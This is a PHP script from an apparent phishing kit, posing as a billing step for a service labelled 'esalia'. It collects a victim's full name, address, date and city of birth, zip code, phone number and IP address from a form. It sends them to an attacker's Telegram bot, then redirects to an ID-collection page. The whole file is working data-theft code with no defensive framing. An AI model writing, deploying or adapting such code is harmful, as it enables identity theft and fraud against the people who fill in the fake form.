<?php

session_start();

include '../../email.php';


$ip = getenv("REMOTE_ADDR");


$message = "[+]━━━━【🔥 bILLING 🔥】━━━━[+]\r\n";
$message .= "[+] Full Name :  " .$_POST['name']."\r\n";
$message .= "[+] Adress  :  ".$_POST['adr']."\r\n";
$message .= "[+] Date de naissance :  ".$_POST['dob']."\r\n";
$message .= "[+] Ville de naissence  :  ".$_POST['city']."\r\n";
$message .= "[+] zip  :  ".$_POST['zip']."\r\n";
$message .= "[+] phone  :  ".$_POST['tel']."\r\n";
$message .= "[+]━━━━【💻 System INFO】━━━━[+]\r\n";
$message .= "[+] IP : " .$ip."\n";
$message .= "[+]━━━━【🔥 esalia 🔥】━━━━[+]\n";



file_get_contents("https://api.telegram.org/bot".$api."/sendMessage?chat_id=".$chatid."&text=" . urlencode($message)."" );

HEADER("Location: ../id.php");


?>

